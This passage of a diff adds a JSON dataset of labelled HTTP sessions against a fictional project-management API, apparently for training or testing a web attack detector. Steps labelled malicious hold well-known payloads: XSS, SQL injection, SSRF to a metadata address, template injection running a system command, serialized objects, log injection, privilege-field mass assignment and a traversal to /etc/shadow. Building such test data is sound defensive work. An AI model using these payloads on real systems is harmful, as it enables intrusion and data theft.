+          "Authorization": "Bearer token_21"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess122",
+    "client_ip": "192.168.12.34",
+    "steps": [
+      {
+        "id": "sess122-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer22@chromapress.test",
+          "password": "Password22!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess122-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_22"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess122-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/track_22/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_22"
+        },
+        "body": {
+          "content": "<img src=x onerror=alert(1)>"
+        },
+        "note": "The client submits browser-executed code in a note."
+      },
+      {
+        "id": "sess122-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/tracks/track_22/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_22",
+          "User-Agent": "Mozilla/5.0 (Windows NT 4.0; WOW64)"
+        },
+        "body": null,
+        "note": "The client retrieves notes using an old browser header."
+      },
+      {
+        "id": "sess122-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_22",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_22"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess123",
+    "client_ip": "10.0.40.88",
+    "steps": [
+      {
+        "id": "sess123-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer23@chromapress.test",
+          "password": "Password23!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess123-s02",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_23"
+        },
+        "body": {
+          "title": "Webhook Test",
+          "description": "Send data to http://10.0.0.1:9090/collect"
+        },
+        "note": "The client includes an internal IP address in the description body."
+      },
+      {
+        "id": "sess123-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_23"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess123-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_23",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_23"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess124",
+    "client_ip": "192.168.15.20",
+    "steps": [
+      {
+        "id": "sess124-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer24@chromapress.test",
+          "password": "Password24!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess124-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_24"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess124-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_24"
+        },
+        "body": {
+          "title": "Expression",
+          "description": "{{constructor.constructor('return process')()}}"
+        },
+        "note": "The client submits a template expression payload."
+      },
+      {
+        "id": "sess124-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_24",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_24",
+          "X-Note": "Mentioning evaluation concept"
+        },
+        "body": null,
+        "note": "The client retrieves project details with a suspicious header word."
+      },
+      {
+        "id": "sess124-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_25",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_24"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess125",
+    "client_ip": "10.0.50.15",
+    "steps": [
+      {
+        "id": "sess125-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer25@chromapress.test",
+          "password": "Password25!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess125-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_25"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess125-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_25"
+        },
+        "body": {
+          "title": "Java Object",
+          "description": "aced0005737200116java.util.HashMap..."
+        },
+        "note": "The client provides a serialized object payload."
+      },
+      {
+        "id": "sess125-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_25",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_25"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess125-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_26",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_25"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess126",
+    "client_ip": "192.168.18.50",
+    "steps": [
+      {
+        "id": "sess126-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer26@chromapress.test",
+          "password": "Password26!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess126-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_26"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess126-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_26"
+        },
+        "body": {
+          "title": "Log Entry",
+          "description": "Standard note\n2026-03-10 14:22:01 [WARN] System reboot initiated"
+        },
+        "note": "The client includes a newline plus a log stamp in the description."
+      },
+      {
+        "id": "sess126-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_26",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_26"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess127",
+    "client_ip": "10.0.60.11",
+    "steps": [
+      {
+        "id": "sess127-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/management/metrics",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": null,
+        "note": "The client requests a management path not present in the contract."
+      },
+      {
+        "id": "sess127-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer27@chromapress.test",
+          "password": "Password27!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess127-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_27"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess127-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_27",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_27"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess128",
+    "client_ip": "192.168.22.10",
+    "steps": [
+      {
+        "id": "sess128-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer28@chromapress.test",
+          "password": "Password28!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess128-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_28"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess128-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_28a",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_28"
+        },
+        "body": null,
+        "note": "The client views the first owned project."
+      },
+      {
+        "id": "sess128-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_28b",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_28"
+        },
+        "body": null,
+        "note": "The client views a second owned project."
+      },
+      {
+        "id": "sess128-s05",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj_28a/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_28"
+        },
+        "body": {
+          "trackName": "Track One",
+          "durationSeconds": 200,
+          "source_file": "master_audio_v2.wav"
+        },
+        "note": "The track creation includes a harmless extra source file field."
+      }
+    ]
+  },
+  {
+    "session_id": "sess129",
+    "client_ip": "172.20.10.5",
+    "steps": [
+      {
+        "id": "sess129-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer29@chromapress.test",
+          "password": "Password29!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess129-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_29"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess129-s03",
+        "label": "suspicious_benign",
+        "method": "PUT",
+        "path": "/projects/proj_29",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_29"
+        },
+        "body": {
+          "title": "Project Updated\nwith notes on layout",
+          "status": "in_progress"
+        },
+        "note": "The update body contains a newline continuing a sentence."
+      },
+      {
+        "id": "sess129-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_29",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_29"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess130",
+    "client_ip": "192.168.30.40",
+    "steps": [
+      {
+        "id": "sess130-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer30@chromapress.test",
+          "password": "Password30!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess130-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_30"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess130-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_30"
+        },
+        "body": {
+          "title": "Injection Test",
+          "description": "test' OR '1'='1"
+        },
+        "note": "The client submits query injection inside the description field."
+      },
+      {
+        "id": "sess130-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_30",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_30"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess130-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_31",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_30"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess131",
+    "client_ip": "10.0.70.20",
+    "steps": [
+      {
+        "id": "sess131-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer31@chromapress.test",
+          "password": "Password31!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess131-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_31"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess131-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_31/tracks",
+        "query": {
+          "ref_one": "proj_master_x",
+          "ref_two": "proj_master_y",
+          "ref_three": "proj_master_z"
+        },
+        "headers": {
+          "Authorization": "Bearer token_31"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. The path is a declared track list. The extra query names are not parameters of this operation."
+      },
+      {
+        "id": "sess131-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_31",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_31"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess132",
+    "client_ip": "192.168.40.15",
+    "steps": [
+      {
+        "id": "sess132-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer32@chromapress.test",
+          "password": "Password32!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess132-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_32"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess132-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_32"
+        },
+        "body": {
+          "title": "Privilege Escalation",
+          "access_level": "superuser"
+        },
+        "note": "The client submits an unallowed privilege field in the project body."
+      },
+      {
+        "id": "sess132-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_32",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_32"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess132-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_33",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_32"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess133",
+    "client_ip": "10.0.80.30",
+    "steps": [
+      {
+        "id": "sess133-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer33@chromapress.test",
+          "password": "Password33!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess133-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_33"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess133-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/shadow/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_33"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal in the path."
+      },
+      {
+        "id": "sess133-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_33",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_33"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess134",
+    "client_ip": "192.168.45.10",
+    "steps": [
+      {
+        "id": "sess134-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer34@chromapress.test",
+          "password": "Password34!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess134-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_34"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess134-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/track_34/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_34"
+        },
+        "body": {
+          "content": "<svg onload=alert('XSS')>"
+        },
+        "note": "The client submits browser-executed code in a note."
+      },
+      {
+        "id": "sess134-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_34/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_34"
+        },
+        "body": null,
+        "note": "The client retrieves track notes."
+      },
+      {
+        "id": "sess134-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_34",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_34"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess135",
+    "client_ip": "10.0.90.15",
+    "steps": [
+      {
+        "id": "sess135-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer35@chromapress.test",
+          "password": "Password35!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess135-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_35"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess135-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_35"
+        },
+        "body": {
+          "title": "Internal SSRF",
+          "description": "Ping http://169.254.169.254/latest/meta-data"
+        },
+        "note": "The client includes an internal metadata address in the body."
+      },
+      {
+        "id": "sess135-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_35",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_35"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess136",
+    "client_ip": "192.168.55.20",
+    "steps": [
+      {
+        "id": "sess136-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer36@chromapress.test",
+          "password": "Password36!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess136-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_36"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess136-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_36"
+        },
+        "body": {
+          "title": "Template Injection",
+          "description": "${T(java.lang.Runtime).getRuntime().exec('id')}"
+        },
+        "note": "The client includes a template expression payload."
+      },
+      {
+        "id": "sess136-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_36",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_36",
+          "X-Runtime-Check": "verified'ok"
+        },
+        "body": null,
+        "note": "The client checks project details with an apostrophe in a header."
+      },
+      {
+        "id": "sess136-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_37",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_36"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess137",
+    "client_ip": "10.0.100.5",
+    "steps": [
+      {
+        "id": "sess137-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer37@chromapress.test",
+          "password": "Password37!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess137-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_37"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess137-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_37"
+        },
+        "body": {
+          "title": "Object Stream",
+          "description": "rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlclx..."
+        },
+        "note": "The client submits a serialized object payload."
+      },
+      {
+        "id": "sess137-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_37",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_37"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess138",
+    "client_ip": "192.168.60.30",
+    "steps": [
+      {
+        "id": "sess138-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer38@chromapress.test",
+          "password": "Password38!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess138-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_38"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess138-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_38"
+        },
+        "body": {
+          "title": "Log Inject",
+          "description": "Project note\n2026-03-10 16:00:00 [ERROR] Database timeout"
+        },
+        "note": "The client injects a log stamp with a newline."
+      },
+      {
+        "id": "sess138-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_38",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_38"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess138-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_39",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_38"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess139",
+    "client_ip": "10.0.110.8",
+    "steps": [
+      {
+        "id": "sess139-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/users",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": null,
+        "note": "The client accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess139-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer39@chromapress.test",
+          "password": "Password39!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess139-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_39"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess139-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_39",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_39"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess140",
+    "client_ip": "192.168.65.15",
+    "steps": [
+      {
+        "id": "sess140-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer40@chromapress.test",
+          "password": "Password40!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess140-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_40"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess140-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_40a",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_40"
+        },
+        "body": null,
+        "note": "The client views the first owned project."
+      },
+      {
+        "id": "sess140-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_40b",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_40"
+        },
+        "body": null,
+        "note": "The client views a second owned project."
+      },
+      {
+        "id": "sess140-s05",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj_40a/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_40"
+        },
+        "body": {
+          "trackName": "Track B",
+          "durationSeconds": 190,
+          "layout_version": "v2.5"
+        },
+        "note": "The track creation includes a harmless layout version field."
+      }
+    ]
+  },
+  {
+    "session_id": "sess141",
+    "client_ip": "10.0.120.4",
+    "steps": [
+      {
+        "id": "sess141-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer41@chromapress.test",
+          "password": "Password41!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess141-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_41"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess141-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_41"
+        },
+        "body": {
+          "title": "Pressing Batch\nwith updated specifications",
+          "description": "Standard run"
+        },
+        "note": "The project title contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess141-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_41",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_41"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess142",
+    "client_ip": "192.168.70.25",
+    "steps": [
+      {
+        "id": "sess142-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer42@chromapress.test",
+          "password": "Password42!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess142-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_42"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess142-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_42"
+        },
+        "body": {
+          "title": "SQL Injection",
+          "description": "1' OR '1'='1"
+        },
+        "note": "The client submits SQL injection in the description."
+      },
+      {
+        "id": "sess142-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_42",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_42"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess142-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_43",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_42"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess143",
+    "client_ip": "10.0.130.15",
+    "steps": [
+      {
+        "id": "sess143-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer43@chromapress.test",
+          "password": "Password43!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess143-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_43"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess143-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_43/tracks",
+        "query": {
+          "id_ref_1": "proj_secure_01",
+          "id_ref_2": "proj_secure_02",
+          "id_ref_3": "proj_secure_03"
+        },
+        "headers": {
+          "Authorization": "Bearer token_43"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. The path is a declared track list. The extra query names are not parameters of this operation."
+      },
+      {
+        "id": "sess143-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_43",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_43"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess144",
+    "client_ip": "192.168.75.30",
+    "steps": [
+      {
+        "id": "sess144-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer44@chromapress.test",
+          "password": "Password44!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess144-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_44"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess144-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/projects/proj_44",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_44"
+        },
+        "body": {
+          "title": "Privilege Update",
+          "permissions": "admin"
+        },
+        "note": "The client submits an unallowed permissions field."
+      },
+      {
